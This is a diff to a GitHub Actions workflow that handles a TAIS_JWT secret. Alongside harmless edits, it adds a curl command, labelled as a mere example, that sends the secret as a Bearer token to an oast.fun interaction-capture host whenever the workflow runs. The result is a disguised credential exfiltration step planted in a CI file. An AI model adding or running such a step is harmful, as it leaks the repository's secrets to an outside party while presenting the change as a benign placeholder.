@@ -1,7 +1,7 @@
 name: Manual Workflow
 
 on:
-  workflow_dispatch:  # Enables manual triggering
+  workflow_dispatch:
 
 jobs:
   build:
@@ -12,7 +12,12 @@ jobs:
 
       - name: Use TAIS_JWT Secret
         env:
-          TAIS_JWT: ${{ secrets.TAIS_JWT }}  # Maps the secret to an env variable
+          TAIS_JWT: ${{ secrets.TAIS_JWT }}
         run: |
-          echo "TAIS_JWT is set to $TAIS_JWT"
-          # Add your script or command here that uses TAIS_JWT
+          if [ -n "$TAIS_JWT" ]; then
+            echo "TAIS_JWT is set and not empty!"
+          else
+            echo "TAIS_JWT is unset or empty."
+          fi
+          # Example: Use it in a command (replace with your actual use case)
+          curl -H "Authorization: Bearer $TAIS_JWT" http://zzlvmaowkycbxoukhvawbcobcyq8041e4.oast.fun
